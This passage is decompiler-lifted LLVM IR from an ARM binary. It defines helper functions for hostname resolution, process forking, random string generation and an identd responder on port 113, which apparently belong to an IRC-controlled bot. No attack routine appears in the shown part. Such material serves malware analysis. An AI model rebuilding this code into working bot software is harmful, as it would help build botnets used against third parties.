dec_label_pc_8468:                                ; preds = %dec_label_pc_83e8, %dec_label_pc_8390, %dec_label_pc_831c, %dec_label_pc_8460
  %stack_var_-48.0 = phi i32 [ %storemerge4, %dec_label_pc_8390 ], [ %storemerge3, %dec_label_pc_83e8 ], [ %v3_8320, %dec_label_pc_831c ], [ %storemerge, %dec_label_pc_8460 ]
  store i32 %v3_82d4, i32* @r4, align 4
  store i32 %v6_82d4, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8468, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8390, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8484 = load i32, i32* @fp, align 4
  store i32 33932, i32* %stack_var_-16, align 4
  %v2_8488 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8488, i32* @fp, align 4
  %v4_8498 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i8** @global_var_2474c.281 to i32), i32* @r0, align 4
  %v4_84ac = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_2474c.281 to i32), i32 %arg2, i32 %v4_8498)
  %v3_84b4 = call i32 @strlen(i8* bitcast (i8** @global_var_2474c.281 to i8*))
  store i32 %v3_84b4, i32* @r3, align 4
  store i32 %v3_84b4, i32* @r2, align 4
  %v3_84c8 = call i32 @__GI___libc_write(i32 %arg1, i32 ptrtoint (i8** @global_var_2474c.281 to i32))
  store i32 %v3_8484, i32* @fp, align 4
  ret i32 %v3_84c8

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2474c.281 to i32), { 1, 0, 2 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_84e8 = load i32, i32* @fp, align 4
  store i32 34032, i32* %stack_var_-4, align 4
  %v2_84ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_84ec, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_8500 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_8500, i32* @global_var_24b4c.283, align 4
  %v3_8518 = icmp eq i32 %v1_8500, -1
  br i1 %v3_8518, label %dec_label_pc_8520, label %dec_label_pc_8568

dec_label_pc_8520:                                ; preds = %entry
  %v3_8520 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_8520, i32* @r0, align 4
  %v1_8524 = call i32 @__GI_gethostbyname(i32 %v3_8520)
  %v2_8534 = icmp eq i32 %v1_8524, 0
  br i1 %v2_8534, label %dec_label_pc_853c, label %dec_label_pc_8544

dec_label_pc_853c:                                ; preds = %dec_label_pc_8520
  %v1_8540 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8544

dec_label_pc_8544:                                ; preds = %dec_label_pc_8520, %dec_label_pc_853c
  %v1_8548 = add i32 %v1_8524, 16
  %v2_8548 = inttoptr i32 %v1_8548 to i32*
  %v3_8548 = load i32, i32* %v2_8548, align 4
  %v1_854c = inttoptr i32 %v3_8548 to i32*
  %v2_854c = load i32, i32* %v1_854c, align 4
  %v1_8554 = add i32 %v1_8524, 12
  %v2_8554 = inttoptr i32 %v1_8554 to i32*
  %v3_8554 = load i32, i32* %v2_8554, align 4
  store i32 %v3_8554, i32* @r3, align 4
  store i32 %v3_8554, i32* @r2, align 4
  %v3_8564 = call i32 @bcopy(i32 %v2_854c, i32 ptrtoint (i32* @global_var_24b4c.283 to i32), i32 %v3_8554)
  %v2_856c.pre = load i32, i32* @global_var_24b4c.283, align 4
  br label %dec_label_pc_8568

dec_label_pc_8568:                                ; preds = %entry, %dec_label_pc_8544
  %v2_856c = phi i32 [ %v1_8500, %entry ], [ %v2_856c.pre, %dec_label_pc_8544 ]
  store i32 %v3_84e8, i32* @fp, align 4
  ret i32 %v2_856c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_24b4c.283, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8568, { 1, 0 }
  uselistorder label %dec_label_pc_8544, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8588 = load i32, i32* @fp, align 4
  store i32 34192, i32* %stack_var_-4, align 4
  %v2_858c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_858c, i32* @fp, align 4
  %v2_859c = load i8, i8* bitcast (i8** @global_var_2473c.285 to i8*), align 4
  %v7_85a0 = icmp eq i8 %v2_859c, 1
  br i1 %v7_85a0, label %dec_label_pc_85a8, label %dec_label_pc_85b4

dec_label_pc_85a8:                                ; preds = %entry
  br label %dec_label_pc_86b4

dec_label_pc_85b4:                                ; preds = %entry
  %v0_85b4 = call i32 @__libc_fork()
  %v2_85c4 = icmp eq i32 %v0_85b4, 0
  br i1 %v2_85c4, label %dec_label_pc_85cc, label %dec_label_pc_85d8

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85b4
  br label %dec_label_pc_86b4

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85b4
  %v2_85dc = load i32, i32* @global_var_24748.287, align 4
  %v1_85e0 = add i32 %v2_85dc, 1
  store i32 %v1_85e0, i32* @global_var_24748.287, align 4
  %tmp = mul i32 %v2_85dc, 4
  %v3_85f8 = add i32 %tmp, 8
  %v1_8600 = call i32 @malloc(i32 %v3_85f8)
  %v2_865c12 = load i32, i32* @global_var_24748.287, align 4
  %v9_866814 = icmp eq i32 %v2_865c12, 1
  br i1 %v9_866814, label %dec_label_pc_8670, label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_8618
  %storemerge116 = phi i32 [ %v1_8650, %dec_label_pc_8618 ], [ 0, %dec_label_pc_85d8 ]
  %v3_861c = mul i32 %storemerge116, 4
  %v2_8628 = add i32 %v3_861c, %v1_8600
  %v2_863c = load i32, i32* @global_var_27864.289, align 4
  %v2_8640 = add i32 %v2_863c, %v3_861c
  %v1_8644 = inttoptr i32 %v2_8640 to i32*
  %v2_8644 = load i32, i32* %v1_8644, align 4
  %v2_8648 = inttoptr i32 %v2_8628 to i32*
  store i32 %v2_8644, i32* %v2_8648, align 4
  %v1_8650 = add i32 %storemerge116, 1
  %v2_865c = load i32, i32* @global_var_24748.287, align 4
  %v1_8660 = add i32 %v2_865c, -1
  %tmp25 = icmp ugt i32 %v1_8660, %v1_8650
  br i1 %tmp25, label %dec_label_pc_8618, label %dec_label_pc_8658.dec_label_pc_8670_crit_edge

dec_label_pc_8658.dec_label_pc_8670_crit_edge:    ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8670

dec_label_pc_8670:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_8658.dec_label_pc_8670_crit_edge
  %v2_865c.lcssa = phi i32 [ %v2_865c, %dec_label_pc_8658.dec_label_pc_8670_crit_edge ], [ %v2_865c12, %dec_label_pc_85d8 ]
  %v1_8674 = add i32 %v1_8600, -4
  %v3_8680 = mul i32 %v2_865c.lcssa, 4
  %v2_8684 = add i32 %v1_8674, %v3_8680
  %v2_868c = inttoptr i32 %v2_8684 to i32*
  store i32 %v0_85b4, i32* %v2_868c, align 4
  %v2_8694 = load i32, i32* @global_var_27864.289, align 4
  store i32 %v2_8694, i32* @r0, align 4
  %v0_869c = call i32 @free()
  store i32 %v1_8600, i32* @global_var_27864.289, align 4
  br label %dec_label_pc_86b4

dec_label_pc_86b4:                                ; preds = %dec_label_pc_85cc, %dec_label_pc_85a8, %dec_label_pc_8670
  %v3_86b4 = phi i32 [ 0, %dec_label_pc_85cc ], [ 1, %dec_label_pc_85a8 ], [ %v0_85b4, %dec_label_pc_8670 ]
  store i32 %v3_8588, i32* @fp, align 4
  ret i32 %v3_86b4

; uselistorder directives
  uselistorder i32 %v3_861c, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_865c12, { 1, 0 }
  uselistorder i32 %v1_8600, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_86b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8670, { 1, 0 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_86d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_86d4, i32* @ip, align 4
  %v1_8710 = add i32 %tmp, -1
  br label %dec_label_pc_870c

dec_label_pc_86ec:                                ; preds = %dec_label_pc_8730, %dec_label_pc_870c
  %v3_86f8 = call i32 @strlen(i8* %arg1)
  %v2_8700 = add i32 %v1_8710, %v3_86f8
  %v3_8708 = inttoptr i32 %v2_8700 to i8*
  store i8 0, i8* %v3_8708, align 1
  br label %dec_label_pc_870c

dec_label_pc_870c:                                ; preds = %entry, %dec_label_pc_86ec
  %v3_8718 = call i32 @strlen(i8* %arg1)
  %v2_8720 = add i32 %v1_8710, %v3_8718
  %v1_8724 = inttoptr i32 %v2_8720 to i8*
  %v2_8724 = load i8, i8* %v1_8724, align 1
  %v7_8728 = icmp eq i8 %v2_8724, 13
  br i1 %v7_8728, label %dec_label_pc_86ec, label %dec_label_pc_8730

dec_label_pc_8730:                                ; preds = %dec_label_pc_870c
  %v3_873c = call i32 @strlen(i8* %arg1)
  %v2_8744 = add i32 %v1_8710, %v3_873c
  %v1_8748 = inttoptr i32 %v2_8744 to i8*
  %v2_8748 = load i8, i8* %v1_8748, align 1
  %v7_874c = icmp eq i8 %v2_8748, 10
  br i1 %v7_874c, label %dec_label_pc_86ec, label %dec_label_pc_8754

dec_label_pc_8754:                                ; preds = %dec_label_pc_8730
  ret i32 %v3_873c

; uselistorder directives
  uselistorder i32 %v1_8710, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_870c, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8764 = load i32, i32* @r4, align 4
  %v6_8764 = load i32, i32* @fp, align 4
  store i32 34668, i32* %stack_var_-4, align 4
  %v2_8768 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8768, i32* @fp, align 4
  %v0_8774 = call i32 @rand()
  %v2_878c = srem i32 %v0_8774, 5
  %v1_87b0 = add nsw i32 %v2_878c, 4
  %v1_87bc = add nsw i32 %v2_878c, 5
  %v1_87c4 = call i32 @malloc(i32 %v1_87bc)
  %v3_87e4 = inttoptr i32 %v1_87c4 to i8*
  %v4_87e4 = call i32 @__GI_memset(i8* %v3_87e4, i32 0, i32 %v1_87bc)
  store i32 ptrtoint ([16 x i8]* @global_var_1a2fc.292 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a30c.294 to i32), i32* @r1, align 4
  %v3_87f0 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1a2fc.292 to i32), i32 ptrtoint (i32* @global_var_1a30c.294 to i32))
  %v2_8800 = icmp eq i32 %v3_87f0, 0
  br i1 %v2_8800, label %dec_label_pc_8888.preheader, label %dec_label_pc_889c

dec_label_pc_8888.preheader:                      ; preds = %entry
  %v2_889024 = sub nsw i32 -4, %v2_878c
  %v6_889026 = and i32 %v2_889024, %v1_87b0
  %v7_889027 = icmp slt i32 %v6_889026, 0
  %v8_889028 = icmp slt i32 %v2_889024, 0
  %v2_889430 = xor i1 %v8_889028, %v7_889027
  br i1 %v2_889430, label %dec_label_pc_8814, label %dec_label_pc_89c8

dec_label_pc_8814:                                ; preds = %dec_label_pc_8888.preheader, %dec_label_pc_8814
  %storemerge331 = phi i32 [ %v1_8880, %dec_label_pc_8814 ], [ 0, %dec_label_pc_8888.preheader ]
  %v2_8820 = add i32 %storemerge331, %v1_87c4
  store i32 %v2_8820, i32* @r4, align 4
  %v0_8824 = call i32 @rand()
  %v2_883c = srem i32 %v0_8824, 26
  %fold = add nsw i32 %v2_883c, 65
  %v1_8878 = trunc i32 %fold to i8
  %v2_8878 = load i32, i32* @r4, align 4
  %v3_8878 = inttoptr i32 %v2_8878 to i8*
  store i8 %v1_8878, i8* %v3_8878, align 1
  %v1_8880 = add i32 %storemerge331, 1
  %v2_8890 = sub i32 %v1_8880, %v1_87b0
  %v4_8890 = xor i32 %v1_8880, %v1_87b0
  %v5_8890 = xor i32 %v2_8890, %v1_8880
  %v6_8890 = and i32 %v5_8890, %v4_8890
  %v7_8890 = icmp slt i32 %v6_8890, 0
  %v8_8890 = icmp slt i32 %v2_8890, 0
  %v2_8894 = xor i1 %v8_8890, %v7_8890
  br i1 %v2_8894, label %dec_label_pc_8814, label %dec_label_pc_89c8

dec_label_pc_889c:                                ; preds = %entry
  %v0_889c = call i32 @rand()
  store i32 %v0_889c, i32* @r4, align 4
  %v0_88a4 = call i32 @rand()
  %v1_88ac = load i32, i32* @r4, align 4
  %v2_88ac = mul i32 %v1_88ac, %v0_88a4
  %v2_88c4 = sdiv i32 %v2_88ac, 12039
  %tmp23 = mul i32 %v2_88c4, -45402
  %v2_8900 = add i32 %tmp23, %v2_88ac
  %v1_890c = add i32 %v2_8900, 1
  %v2_8928 = ptrtoint i32* %stack_var_-1072 to i32
  br label %dec_label_pc_8948

dec_label_pc_8920:                                ; preds = %dec_label_pc_8948
  %v3_8938 = call i32 @fgets(i32 %v2_8928, i32 1024, i32 %v3_87f0)
  %v1_8940 = add i32 %storemerge2, 1
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_889c, %dec_label_pc_8920
  %storemerge2 = phi i32 [ 0, %dec_label_pc_889c ], [ %v1_8940, %dec_label_pc_8920 ]
  %v2_8950 = sub i32 %storemerge2, %v1_890c
  %v4_8950 = xor i32 %storemerge2, %v1_890c
  %v5_8950 = xor i32 %v2_8950, %storemerge2
  %v6_8950 = and i32 %v5_8950, %v4_8950
  %v7_8950 = icmp slt i32 %v6_8950, 0
  %v8_8950 = icmp slt i32 %v2_8950, 0
  %v2_8954 = xor i1 %v8_8950, %v7_8950
  br i1 %v2_8954, label %dec_label_pc_8920, label %dec_label_pc_8958

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v3_8970 = bitcast i32* %stack_var_-1072 to i8*
  %v4_8970 = call i32 @__GI_memset(i8* %v3_8970, i32 0, i32 1024)
  %v3_898c = call i32 @fgets(i32 %v2_8928, i32 1024, i32 %v3_87f0)
  %v2_89a0 = call i32 @filter(i8* %v3_8970)
  store i32 %v1_87b0, i32* @r2, align 4
  store i32 %v2_8928, i32* @r3, align 4
  store i32 %v1_87c4, i32* @r0, align 4
  store i32 %v2_8928, i32* @r1, align 4
  %v0_89bc = call i32 @memcpy()
  %v1_89c4 = inttoptr i32 %v3_87f0 to i16*
  %v2_89c4 = call i32 @__GI_fclose(i16* %v1_89c4)
  br label %dec_label_pc_89c8

dec_label_pc_89c8:                                ; preds = %dec_label_pc_8888.preheader, %dec_label_pc_8814, %dec_label_pc_8958
  store i32 %v3_8764, i32* @r4, align 4
  store i32 %v6_8764, i32* @fp, align 4
  ret i32 %v1_87c4

; uselistorder directives
  uselistorder i32 %v2_8950, { 1, 0 }
  uselistorder i32 %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_88ac, { 1, 0 }
  uselistorder i32 %v2_8890, { 1, 0 }
  uselistorder i32 %v1_8880, { 3, 2, 1, 0 }
  uselistorder i32 %v2_889024, { 1, 0 }
  uselistorder i32 %v1_87c4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_87b0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_878c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_89c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
  uselistorder label %dec_label_pc_8814, { 1, 0 }
}

define i32 @"$d.11"(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_89dc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_89dc = load i1, i1* @cpsr_v, align 1
  br i1 %v0_89dc, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_89dc
  %v1_89dc = load i32, i32* @r6, align 4
  %v2_89dc = trunc i32 %v1_89dc to i8
  %v4_89dc = inttoptr i32 %v1_89dc to i8*
  store i8 %v2_89dc, i8* %v4_89dc, align 1
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_89dc, %bb
  %v0_89e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_89e0, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  %v1_89e0 = load i32, i32* @sl, align 4
  %v3_89e0 = load i32, i32* %r1.global-to-local, align 4
  %v4_89e0 = inttoptr i32 %v3_89e0 to i32*
  store i32 %v1_89e0, i32* %v4_89e0, align 4
  %v5_89e0 = load i32, i32* @ip, align 4
  %v6_89e0 = load i32, i32* %r1.global-to-local, align 4
  %v7_89e0 = sub i32 %v6_89e0, %v5_89e0
  store i32 %v7_89e0, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  %v0_89ec = load i1, i1* @cpsr_n, align 1
  %v1_89ec = load i1, i1* @cpsr_v, align 1
  %v2_89ec = xor i1 %v0_89ec, %v1_89ec
  br i1 %v2_89ec, label %bb3, label %bb4

bb3:                                              ; preds = %.thread
  %v4_89ec = inttoptr i32 %arg3 to i32*
  store i32 %arg1, i32* %v4_89ec, align 4
  %v6_89ec = add i32 %arg3, 4
  %v7_89ec = inttoptr i32 %v6_89ec to i32*
  %v8_89ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_89ec, i32* %v7_89ec, align 4
  %v9_89ec = add i32 %arg3, 8
  %v10_89ec = inttoptr i32 %v9_89ec to i32*
  store i32 %arg3, i32* %v10_89ec, align 4
  %v12_89ec = add i32 %arg3, 12
  %v13_89ec = inttoptr i32 %v12_89ec to i32*
  %v14_89ec = load i32, i32* @r4, align 4
  store i32 %v14_89ec, i32* %v13_89ec, align 4
  %v15_89ec = add i32 %arg3, 16
  %v16_89ec = inttoptr i32 %v15_89ec to i32*
  %v17_89ec = load i32, i32* @r5, align 4
  store i32 %v17_89ec, i32* %v16_89ec, align 4
  %v18_89ec = add i32 %arg3, 20
  %v19_89ec = inttoptr i32 %v18_89ec to i32*
  %v20_89ec = load i32, i32* @r6, align 4
  store i32 %v20_89ec, i32* %v19_89ec, align 4
  %v21_89ec = add i32 %arg3, 24
  %v22_89ec = inttoptr i32 %v21_89ec to i32*
  %v23_89ec = load i32, i32* @r8, align 4
  store i32 %v23_89ec, i32* %v22_89ec, align 4
  %v24_89ec = add i32 %arg3, 28
  %v25_89ec = inttoptr i32 %v24_89ec to i32*
  %v26_89ec = load i32, i32* @ip, align 4
  store i32 %v26_89ec, i32* %v25_89ec, align 4
  %v27_89ec = add i32 %arg3, 32
  %v28_89ec = inttoptr i32 %v27_89ec to i32*
  %v29_89ec = load i32, i32* @lr, align 4
  store i32 %v29_89ec, i32* %v28_89ec, align 4
  br label %bb4

bb4:                                              ; preds = %.thread, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 %arg3, { 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_89f4 = load i32, i32* @fp, align 4
  store i32 %v3_89f4, i32* %stack_var_-16, align 4
  store i32 35324, i32* %stack_var_-4, align 4
  %v13_89f4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_89f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_89f8, i32* @fp, align 4
  %v3_8a0c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_8a1c = icmp eq i32 %v3_8a0c, -1
  br i1 %v7_8a1c, label %dec_label_pc_8dac, label %dec_label_pc_8a24

dec_label_pc_8a24:                                ; preds = %entry
  store i32 2, i32* %stack_var_-60, align 4
  %v1_8a30 = call i32 @__GI_htons(i32 113)
  %v3_8a58 = bitcast i32* %stack_var_-52 to i8*
  %v4_8a58 = call i32 @__GI_memset(i8* %v3_8a58, i32 0, i32 8)
  %v2_8a5c = ptrtoint i32* %stack_var_-60 to i32
  %v4_8a6c = call i32 @bind(i32 %v3_8a0c, i32 %v2_8a5c, i32 16, i32 %v2_8a5c)
  %v7_8a74 = icmp eq i32 %v4_8a6c, -1
  br i1 %v7_8a74, label %dec_label_pc_8dac, label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8a24
  %v2_8a84 = call i32 @listen(i32 %v3_8a0c, i32 1)
  %v7_8a8c = icmp eq i32 %v2_8a84, -1
  br i1 %v7_8a8c, label %dec_label_pc_8dac, label %dec_label_pc_8a94

dec_label_pc_8a94:                                ; preds = %dec_label_pc_8a7c
  %v0_8a94 = call i32 @__libc_fork()
  %v2_8a9c = icmp eq i32 %v0_8a94, 0
  br i1 %v2_8a9c, label %dec_label_pc_8dac, label %dec_label_pc_8aa4

dec_label_pc_8aa4:                                ; preds = %dec_label_pc_8a94
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8aac = ptrtoint i32* %stack_var_-76 to i32
  %v2_8ab0 = ptrtoint i32* %stack_var_-44 to i32
  %v5_8abc = call i32 @__libc_accept(i32 %v3_8a0c, i32 %v2_8aac, i32 %v2_8ab0, i32 %v2_8aac, i32 16)
  %v2_8acc = add i32 %v5_8abc, 1
  %v3_8acc = icmp eq i32 %v5_8abc, -1
  br i1 %v3_8acc, label %dec_label_pc_8ad4, label %dec_label_pc_8adc.preheader

dec_label_pc_8ad4:                                ; preds = %dec_label_pc_8aa4
  %v1_8ad8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8adc.preheader

dec_label_pc_8adc.preheader:                      ; preds = %dec_label_pc_8ad4, %dec_label_pc_8aa4
  %v2_8ae4 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8b24 = udiv i32 %v5_8abc, 32
  %v3_8b38 = mul nuw nsw i32 %v3_8b24, 4
  %v2_8b40 = add i32 %v3_8b38, %v13_89f4
  %v1_8b50 = urem i32 %v5_8abc, 32
  %v6_8b58 = shl i32 1, %v1_8b50
  %v2_8ba8 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8bf4 = add i32 %v2_8b40, -1220
  %v1_8bf8 = inttoptr i32 %v2_8bf4 to i32*
  br label %dec_label_pc_8af8.lr.ph

dec_label_pc_8af8.lr.ph:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8adc.preheader
  br label %dec_label_pc_8af8

dec_label_pc_8af8:                                ; preds = %dec_label_pc_8af8.lr.ph, %dec_label_pc_8af8
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8af8.lr.ph ], [ %v1_8b0c, %dec_label_pc_8af8 ]
  %v5_8b04 = mul nuw nsw i32 %storemerge26, 4
  %v6_8b04 = add i32 %v5_8b04, %v2_8ae4
  %v7_8b04 = inttoptr i32 %v6_8b04 to i32*
  store i32 0, i32* %v7_8b04, align 4
  %v1_8b0c = add nuw nsw i32 %storemerge26, 1
  %tmp33 = icmp ult i32 %v1_8b0c, 32
  br i1 %tmp33, label %dec_label_pc_8af8, label %dec_label_pc_8b20

dec_label_pc_8b20:                                ; preds = %dec_label_pc_8af8
  %v2_8b48 = load i32, i32* %v1_8bf8, align 4
  %v2_8b5c = or i32 %v2_8b48, %v6_8b58
  store i32 %v2_8b5c, i32* %v1_8bf8, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8bc0 = call i32 @__libc_select(i32 %v2_8acc, i32 %v2_8ae4, i32 0, i32 0, i32 %v2_8ba8)
  %v1_8bc8 = icmp slt i32 %v5_8bc0, 0
  br i1 %v1_8bc8, label %dec_label_pc_8bd0, label %dec_label_pc_8bd8

dec_label_pc_8bd0:                                ; preds = %dec_label_pc_8b20
  %v1_8bd4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b20, %dec_label_pc_8bd0
  %v2_8bf8 = load i32, i32* %v1_8bf8, align 4
  %v6_8c041 = lshr i32 %v2_8bf8, %v1_8b50
  %v1_8c0c = urem i32 %v6_8c041, 2
  %v2_8c10 = icmp eq i32 %v1_8c0c, 0
  br i1 %v2_8c10, label %dec_label_pc_8af8.lr.ph, label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8bd8
  %v2_8c24 = ptrtoint i32* %stack_var_-1100 to i32
  %v4_8c38 = call i32 @__libc_recv(i32 %v5_8abc, i32 %v2_8c24, i32 1024, i32 0)
  %tmp34 = icmp slt i32 %v4_8c38, 1
  br i1 %tmp34, label %dec_label_pc_8c5c, label %dec_label_pc_8c50

dec_label_pc_8c50:                                ; preds = %dec_label_pc_8c1c
  %v7_8c58 = icmp slt i32 %v4_8c38, 20
  br i1 %v7_8c58, label %dec_label_pc_8c64, label %dec_label_pc_8c5c

dec_label_pc_8c5c:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c1c
  %v1_8c60 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8c64

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8c50, %dec_label_pc_8c5c
  %v2_8c74 = add i32 %v13_89f4, -1084
  %v2_8c78 = add i32 %v2_8c74, %v4_8c38
  %v3_8c80 = inttoptr i32 %v2_8c78 to i8*
  store i8 0, i8* %v3_8c80, align 1
  %v1_8c88 = add i32 %v13_89f4, -1
  %v2_8c98 = add i32 %v1_8c88, %v4_8c38
  %v2_8c9c = add i32 %v2_8c98, -1084
  %v1_8ca0 = inttoptr i32 %v2_8c9c to i8*
  %v2_8ca0 = load i8, i8* %v1_8ca0, align 1
  %v7_8ca4 = icmp eq i8 %v2_8ca0, 10
  br i1 %v7_8ca4, label %dec_label_pc_8cd4, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8c64
  %v2_8cc8 = load i8, i8* %v1_8ca0, align 1
  %v7_8ccc = icmp eq i8 %v2_8cc8, 13
  br i1 %v7_8ccc, label %dec_label_pc_8cd4, label %dec_label_pc_8cf8

dec_label_pc_8cd4:                                ; preds = %dec_label_pc_8cac, %dec_label_pc_8c64
  store i8 0, i8* %v1_8ca0, align 1
  br label %dec_label_pc_8cf8

dec_label_pc_8cf8:                                ; preds = %dec_label_pc_8cac, %dec_label_pc_8cd4
  %v1_8cfc = add i32 %v13_89f4, -2
  %v2_8d0c = add i32 %v1_8cfc, %v4_8c38
  %v2_8d10 = add i32 %v2_8d0c, -1084
  %v1_8d14 = inttoptr i32 %v2_8d10 to i8*
  %v2_8d14 = load i8, i8* %v1_8d14, align 1
  %v7_8d18 = icmp eq i8 %v2_8d14, 10
  br i1 %v7_8d18, label %dec_label_pc_8d48, label %dec_label_pc_8d20

dec_label_pc_8d20:                                ; preds = %dec_label_pc_8cf8
  %v2_8d3c = load i8, i8* %v1_8d14, align 1
  %v7_8d40 = icmp eq i8 %v2_8d3c, 13
  br i1 %v7_8d40, label %dec_label_pc_8d48, label %dec_label_pc_8d6c

dec_label_pc_8d48:                                ; preds = %dec_label_pc_8d20, %dec_label_pc_8cf8
  store i8 0, i8* %v1_8d14, align 1
  br label %dec_label_pc_8d6c

dec_label_pc_8d6c:                                ; preds = %dec_label_pc_8d20, %dec_label_pc_8d48
  %v4_8d90 = call i32 @Send(i32 %v5_8abc, i32 ptrtoint ([25 x i8]* @global_var_1a310.300 to i32), i32 %v2_8c24)
  %v1_8d98 = call i32 @__GI___libc_close(i32 %v5_8abc)
  %v1_8da0 = call i32 @__GI___libc_close(i32 %v3_8a0c)
  %v1_8da8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8dac

dec_label_pc_8dac:                                ; preds = %dec_label_pc_8a94, %dec_label_pc_8a7c, %dec_label_pc_8a24, %entry, %dec_label_pc_8d6c
  %v1_8db4 = phi i32 [ 0, %dec_label_pc_8a94 ], [ %v2_8a84, %dec_label_pc_8a7c ], [ %v4_8a6c, %dec_label_pc_8a24 ], [ %v3_8a0c, %entry ], [ %v1_8da8, %dec_label_pc_8d6c ]
  ret i32 %v1_8db4

; uselistorder directives
